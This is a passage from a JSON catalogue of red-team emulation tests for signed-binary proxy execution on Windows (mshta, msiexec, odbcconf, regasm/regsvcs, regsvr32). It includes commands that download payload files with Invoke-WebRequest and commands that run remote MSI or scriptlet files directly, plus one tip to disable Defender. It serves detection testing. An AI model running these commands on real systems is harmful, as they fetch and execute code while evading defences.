      "description": "Use Mshta to execute arbitrary PowerShell. Example is from the 2021 Threat Detection Report by Red Canary.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "mshta.exe \"about:<hta:application><script language=\"VBScript\">Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run%20\"\"powershell.exe%20-nop%20-Command%20Write-Host%20#{message};Start-Sleep%20-Seconds%20#{seconds_to_sleep}\"\"\"))</script>'\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "message",
          "description": "Encoded message to include",
          "type": "string",
          "default_value": "Hello,%20MSHTA!"
        },
        {
          "name": "seconds_to_sleep",
          "description": "How many seconds to sleep/wait",
          "type": "integer",
          "default_value": 5
        }
      ],
      "prerequisites": [],
      "rx_module_id": "8707a805-2b76-4f32-b1c0-14e558205772",
      "module_name": "Mshta used to Execute PowerShell"
    },
    {
      "index": 1003,
      "technique_id": "T1218.007",
      "technique_name": "Signed Binary Proxy Execution: Msiexec",
      "description": "Executes an MSI containing embedded JScript code using msiexec.exe\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "msi_payload",
          "description": "MSI file to execute",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.007\\bin\\T1218.007_JScript.msi"
        },
        {
          "name": "msi_exe",
          "description": "MSIExec File Path",
          "type": "path",
          "default_value": "c:\\windows\\system32\\msiexec.exe"
        },
        {
          "name": "action",
          "description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n",
          "type": "string",
          "default_value": "i"
        }
      ],
      "prerequisites": [
        {
          "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
          "check_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.007/bin/T1218.007_JScript.msi\" -OutFile \"#{msi_payload}\"\n"
        }
      ],
      "rx_module_id": "a059b6c4-e7d6-4b2e-bcd7-9b2b33191a04",
      "module_name": "Msiexec.exe - Execute Local MSI file with embedded JScript"
    },
    {
      "index": 1004,
      "technique_id": "T1218.007",
      "technique_name": "Signed Binary Proxy Execution: Msiexec",
      "description": "Executes an MSI containing embedded VBScript code using msiexec.exe\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "msi_payload",
          "description": "MSI file to execute",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.007\\bin\\T1218.007_VBScript.msi"
        },
        {
          "name": "msi_exe",
          "description": "MSIExec File Path",
          "type": "path",
          "default_value": "c:\\windows\\system32\\msiexec.exe"
        },
        {
          "name": "action",
          "description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n",
          "type": "string",
          "default_value": "i"
        }
      ],
      "prerequisites": [
        {
          "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
          "check_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.007/bin/T1218.007_VBScript.msi\" -OutFile \"#{msi_payload}\"\n"
        }
      ],
      "rx_module_id": "8d73c7b0-c2b1-4ac1-881a-4aa644f76064",
      "module_name": "Msiexec.exe - Execute Local MSI file with embedded VBScript"
    },
    {
      "index": 1005,
      "technique_id": "T1218.007",
      "technique_name": "Signed Binary Proxy Execution: Msiexec",
      "description": "Executes an MSI containing an embedded DLL using msiexec.exe\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "msi_payload",
          "description": "MSI file to execute",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.007\\bin\\T1218.007_DLL.msi"
        },
        {
          "name": "msi_exe",
          "description": "MSIExec File Path",
          "type": "path",
          "default_value": "c:\\windows\\system32\\msiexec.exe"
        },
        {
          "name": "action",
          "description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n",
          "type": "string",
          "default_value": "i"
        }
      ],
      "prerequisites": [
        {
          "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
          "check_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.007/bin/T1218.007_DLL.msi\" -OutFile \"#{msi_payload}\"\n"
        }
      ],
      "rx_module_id": "628fa796-76c5-44c3-93aa-b9d8214fd568",
      "module_name": "Msiexec.exe - Execute Local MSI file with an embedded DLL"
    },
    {
      "index": 1006,
      "technique_id": "T1218.007",
      "technique_name": "Signed Binary Proxy Execution: Msiexec",
      "description": "Executes an MSI containing an embedded EXE using msiexec.exe\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "msi_payload",
          "description": "MSI file to execute",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.007\\bin\\T1218.007_EXE.msi"
        },
        {
          "name": "msi_exe",
          "description": "MSIExec File Path",
          "type": "path",
          "default_value": "c:\\windows\\system32\\msiexec.exe"
        },
        {
          "name": "action",
          "description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n",
          "type": "string",
          "default_value": "i"
        }
      ],
      "prerequisites": [
        {
          "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
          "check_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.007/bin/T1218.007_EXE.msi\" -OutFile \"#{msi_payload}\"\n"
        }
      ],
      "rx_module_id": "ed3fa08a-ca18-4009-973e-03d13014d0e8",
      "module_name": "Msiexec.exe - Execute Local MSI file with an embedded EXE"
    },
    {
      "index": 1007,
      "technique_id": "T1218.007",
      "technique_name": "Signed Binary Proxy Execution: Msiexec",
      "description": "Executes an MSI containing embedded JScript code using the WMI Win32_Product class\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "msi_payload",
          "description": "MSI file to execute",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.007\\bin\\T1218.007_JScript.msi"
        },
        {
          "name": "action",
          "description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n",
          "type": "string",
          "default_value": "Install"
        }
      ],
      "prerequisites": [
        {
          "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
          "check_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.007/bin/T1218.007_JScript.msi\" -OutFile \"#{msi_payload}\"\n"
        }
      ],
      "rx_module_id": "882082f0-27c6-4eec-a43c-9aa80bccdb30",
      "module_name": "WMI Win32_Product Class - Execute Local MSI file with embedded JScript"
    },
    {
      "index": 1008,
      "technique_id": "T1218.007",
      "technique_name": "Signed Binary Proxy Execution: Msiexec",
      "description": "Executes an MSI containing embedded VBScript code using the WMI Win32_Product class\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "msi_payload",
          "description": "MSI file to execute",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.007\\bin\\T1218.007_VBScript.msi"
        },
        {
          "name": "action",
          "description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n",
          "type": "string",
          "default_value": "Install"
        }
      ],
      "prerequisites": [
        {
          "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
          "check_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.007/bin/T1218.007_VBScript.msi\" -OutFile \"#{msi_payload}\"\n"
        }
      ],
      "rx_module_id": "cf470d9a-58e7-43e5-b0d2-805dffc05576",
      "module_name": "WMI Win32_Product Class - Execute Local MSI file with embedded VBScript"
    },
    {
      "index": 1009,
      "technique_id": "T1218.007",
      "technique_name": "Signed Binary Proxy Execution: Msiexec",
      "description": "Executes an MSI containing an embedded DLL using the WMI Win32_Product class\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "msi_payload",
          "description": "MSI file to execute",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.007\\bin\\T1218.007_DLL.msi"
        },
        {
          "name": "action",
          "description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n",
          "type": "string",
          "default_value": "Install"
        }
      ],
      "prerequisites": [
        {
          "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
          "check_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.007/bin/T1218.007_DLL.msi\" -OutFile \"#{msi_payload}\"\n"
        }
      ],
      "rx_module_id": "32eb3861-30da-4993-897a-42737152f5f8",
      "module_name": "WMI Win32_Product Class - Execute Local MSI file with an embedded DLL"
    },
    {
      "index": 1010,
      "technique_id": "T1218.007",
      "technique_name": "Signed Binary Proxy Execution: Msiexec",
      "description": "Executes an MSI containing an embedded EXE using the WMI Win32_Product class\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "msi_payload",
          "description": "MSI file to execute",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.007\\bin\\T1218.007_EXE.msi"
        },
        {
          "name": "action",
          "description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n",
          "type": "string",
          "default_value": "Install"
        }
      ],
      "prerequisites": [
        {
          "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
          "check_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.007/bin/T1218.007_EXE.msi\" -OutFile \"#{msi_payload}\"\n"
        }
      ],
      "rx_module_id": "55080eb0-49ae-4f55-a440-4167b7974f79",
      "module_name": "WMI Win32_Product Class - Execute Local MSI file with an embedded EXE"
    },
    {
      "index": 1011,
      "technique_id": "T1218.007",
      "technique_name": "Signed Binary Proxy Execution: Msiexec",
      "description": "Loads a DLL into msiexec.exe and calls its DllRegisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{msi_exe} /y \"#{dll_payload}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "dll_payload",
          "description": "DLL to execute that has an implemented DllRegisterServer function",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.007\\bin\\MSIRunner.dll"
        },
        {
          "name": "msi_exe",
          "description": "MSIExec File Path",
          "type": "path",
          "default_value": "c:\\windows\\system32\\msiexec.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "The DLL must exist on disk at specified location (#{dll_payload})\n",
          "check_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.007/bin/MSIRunner.dll -OutFile \"#{dll_payload}\"\n"
        }
      ],
      "rx_module_id": "0106ffa5-fab6-4c7d-82e3-e6b8867d5e5d",
      "module_name": "Msiexec.exe - Execute the DllRegisterServer function of a DLL"
    },
    {
      "index": 1012,
      "technique_id": "T1218.007",
      "technique_name": "Signed Binary Proxy Execution: Msiexec",
      "description": "Loads a DLL into msiexec.exe and calls its DllUnregisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{msi_exe} /z \"#{dll_payload}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "dll_payload",
          "description": "DLL to execute that has an implemented DllUnregisterServer function",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.007\\bin\\MSIRunner.dll"
        },
        {
          "name": "msi_exe",
          "description": "MSIExec File Path",
          "type": "path",
          "default_value": "c:\\windows\\system32\\msiexec.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "The DLL must exist on disk at specified location (#{dll_payload})\n",
          "check_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.007/bin/MSIRunner.dll -OutFile \"#{dll_payload}\"\n"
        }
      ],
      "rx_module_id": "ab09ec85-4955-4f9c-b8e0-6851baf4d47f",
      "module_name": "Msiexec.exe - Execute the DllUnregisterServer function of a DLL"
    },
    {
      "index": 1013,
      "technique_id": "T1218.007",
      "technique_name": "Signed Binary Proxy Execution: Msiexec",
      "description": "Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{msi_exe} /q /i \"#{msi_payload}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "msi_payload",
          "description": "MSI file to execute",
          "type": "string",
          "default_value": "https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.007/bin/T1218.007_JScript.msi"
        },
        {
          "name": "msi_exe",
          "description": "MSIExec File Path",
          "type": "path",
          "default_value": "c:\\windows\\system32\\msiexec.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "44a4bedf-ffe3-452e-bee4-6925ab125662",
      "module_name": "Msiexec.exe - Execute Remote MSI file"
    },
    {
      "index": 1014,
      "technique_id": "T1218.008",
      "technique_name": "Signed Binary Proxy Execution: Odbcconf",
      "description": "Execute arbitrary DLL file stored locally.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "odbcconf.exe /S /A {REGSVR \"#{dll_payload}\"}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "dll_payload",
          "description": "DLL to execute",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.008\\src\\Win32\\T1218-2.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})\n",
          "check_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.008/src/Win32/T1218-2.dll\" -OutFile \"#{dll_payload}\"\n"
        }
      ],
      "rx_module_id": "2430498b-06c0-4b92-a448-8ad263c388e2",
      "module_name": "Odbcconf.exe - Execute Arbitrary DLL"
    },
    {
      "index": 1015,
      "technique_id": "T1218.008",
      "technique_name": "Signed Binary Proxy Execution: Odbcconf",
      "description": "Execute arbitrary response file that will spawn PowerShell.exe.\nSource files: https://github.com/woanware/application-restriction-bypasses\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "cd \"#{rsp_file_path}\"\nodbcconf.exe -f \"#{rsp_file_name}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "rsp_file_name",
          "description": "Response file name to load",
          "type": "string",
          "default_value": "T1218.008.rsp"
        },
        {
          "name": "rsp_file_path",
          "description": "Response file path",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1218.008\\bin\\"
        }
      ],
      "prerequisites": [
        {
          "description": "T1218.008.rsp must exist on disk at specified location (#{rsp_file_path}#{rsp_file_name})\n",
          "check_command": "if (Test-Path \"#{rsp_file_path}#{rsp_file_name}\") {exit 0} else {exit 1}\n",
          "install_command": "Invoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.008/bin/T1218.008.rsp\" -OutFile \"#{rsp_file_path}#{rsp_file_name}\"\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.008/bin/o.dll\" -OutFile \"#{rsp_file_path}\\o.dll\"\n"
        }
      ],
      "rx_module_id": "331ce274-f9c9-440b-9f8c-a1006e1fce0b",
      "module_name": "Odbcconf.exe - Load Response File"
    },
    {
      "index": 1016,
      "technique_id": "T1218.009",
      "technique_name": "Signed Binary Proxy Execution: Regsvcs/Regasm",
      "description": "Executes the Uninstall Method, No Admin Rights Required. Upon execution, \"I shouldn't really execute either.\" will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"#{output_file}\" /target:library \"#{source_file}\"\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "del #{output_file} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Location of the payload",
          "type": "path",
          "default_value": "%tmp%\\T1218.009.dll"
        },
        {
          "name": "source_file",
          "description": "Location of the CSharp source_file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.009\\src\\T1218.009.cs"
        }
      ],
      "prerequisites": [
        {
          "description": "The CSharp source file must exist on disk at specified location (#{source_file})\n",
          "check_command": "if (Test-Path \"#{source_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{source_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.009/src/T1218.009.cs\" -OutFile \"#{source_file}\"\n"
        }
      ],
      "rx_module_id": "71bfbfac-60b1-4fc0-ac8b-2cedbbdcb112",
      "module_name": "Regasm Uninstall Method Call Test"
    },
    {
      "index": 1017,
      "technique_id": "T1218.009",
      "technique_name": "Signed Binary Proxy Execution: Regsvcs/Regasm",
      "description": "Executes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, \"I shouldn't really execute\" will be displayed\nalong with other information about the assembly being installed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"#{output_file}\" /target:library /keyfile:$env:Temp\\key.snk #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe #{output_file}\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item #{output_file} -ErrorAction Ignore | Out-Null\n$parentpath = Split-Path -Path \"#{output_file}\"\nRemove-Item $parentpath\\key.snk -ErrorAction Ignore | Out-Null\nRemove-Item $parentpath\\T1218.009.tlb -ErrorAction Ignore | Out-Null\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Location of the payload",
          "type": "path",
          "default_value": "$Env:TEMP\\T1218.009.dll"
        },
        {
          "name": "source_file",
          "description": "Location of the CSharp source_file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.009\\src\\T1218.009.cs"
        }
      ],
      "prerequisites": [
        {
          "description": "The CSharp source file must exist on disk at specified location (#{source_file})\n",
          "check_command": "if (Test-Path \"#{source_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{source_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.009/src/T1218.009.cs\" -OutFile \"#{source_file}\"\n"
        }
      ],
      "rx_module_id": "fd3c1c6a-02d2-4b72-82d9-71c527abb126",
      "module_name": "Regsvcs Uninstall Method Call Test"
    },
    {
      "index": 1018,
      "technique_id": "T1218.010",
      "technique_name": "Signed Binary Proxy Execution: Regsvr32",
      "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{regsvr32path}\\#{regsvr32name} /s /u /i:\"#{filename}\" scrobj.dll\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "filename",
          "description": "Name of the local file, include path.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.010\\src\\RegSvr32.sct"
        },
        {
          "name": "regsvr32path",
          "description": "Default location of Regsvr32.exe",
          "type": "path",
          "default_value": "C:\\Windows\\system32"
        },
        {
          "name": "regsvr32name",
          "description": "Default name of Regsvr32.exe",
          "type": "string",
          "default_value": "regsvr32.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Regsvr32.sct must exist on disk at specified location (#{filename})\n",
          "check_command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{filename}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.010/src/RegSvr32.sct\" -OutFile \"#{filename}\"\n"
        }
      ],
      "rx_module_id": "449aa403-6aba-47ce-8a37-247d21ef0306",
      "module_name": "Regsvr32 local COM scriptlet execution"
    },
    {
      "index": 1019,
      "technique_id": "T1218.010",
      "technique_name": "Signed Binary Proxy Execution: Regsvr32",
      "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable\nwindows defender real-time protection to fix it. Upon execution, calc.exe will be launched.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{regsvr32path}\\#{regsvr32name} /s /u /i:#{url} scrobj.dll\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "url",
          "description": "URL to hosted sct file",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1218.010/src/RegSvr32.sct"
        },
        {
          "name": "regsvr32path",
          "description": "Default location of Regsvr32.exe",
          "type": "path",
          "default_value": "C:\\Windows\\system32"
        },
        {
          "name": "regsvr32name",
          "description": "Default name of Regsvr32.exe",
          "type": "string",
          "default_value": "regsvr32.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36",
      "module_name": "Regsvr32 remote COM scriptlet execution"
    },
    {
      "index": 1020,
      "technique_id": "T1218.010",
      "technique_name": "Signed Binary Proxy Execution: Regsvr32",
      "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\\#{regsvr32name} /s #{dll_name} )\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "dll_name",
          "description": "Name of DLL to Execute, DLL Should export DllRegisterServer",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.010\\bin\\AllTheThingsx86.dll"
        },
        {
          "name": "regsvr32path",
          "description": "Default location of Regsvr32.exe",
          "type": "path",
          "default_value": "C:\\Windows\\system32"
        },
        {
          "name": "regsvr32name",
          "description": "Default name of Regsvr32.exe",
          "type": "string",
          "default_value": "regsvr32.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})\n",
          "check_command": "if (Test-Path \"#{dll_name}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{dll_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.010/bin/AllTheThingsx86.dll\" -OutFile \"#{dll_name}\"\n"
        }
      ],
      "rx_module_id": "08ffca73-9a3d-471a-aeb0-68b4aa3ab37b",
      "module_name": "Regsvr32 local DLL execution"
    },
    {
      "index": 1021,
      "technique_id": "T1218.010",
      "technique_name": "Signed Binary Proxy Execution: Regsvr32",
      "description": "Replicating observed Gozi maldoc behavior registering a dll with an altered extension\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{regsvr32path}\\#{regsvr32name} /s #{dll_file}\n",
        "elevation_required": false,
        "cleanup_command": "#{regsvr32path}\\#{regsvr32name} /U /s #{dll_file}\n"
      },
      "variables": [
        {
          "name": "dll_file",
          "description": "Path to renamed dll file to be registered",
          "type": "path",
          "default_value": "%temp%\\shell32.jpg"
        },
        {
          "name": "regsvr32path",
          "description": "Default location of Regsvr32.exe",
          "type": "path",
          "default_value": "C:\\Windows\\system32"
        },
        {
          "name": "regsvr32name",
          "description": "Default name of Regsvr32.exe",
          "type": "string",
          "default_value": "regsvr32.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Test requires a renamed dll file\n",
          "check_command": "if exist #{dll_file} ( exit 0 ) else ( exit 1 )\n",
          "install_command": "copy \"C:\\Windows\\System32\\shell32.dll\" \"#{dll_file}\"\n"
        }
      ],
      "rx_module_id": "1ae5ea1f-0a4e-4e54-b2f5-4ac328a7f421",
      "module_name": "Regsvr32 Registering Non DLL"
    },
    {
      "index": 1022,
      "technique_id": "T1218.010",
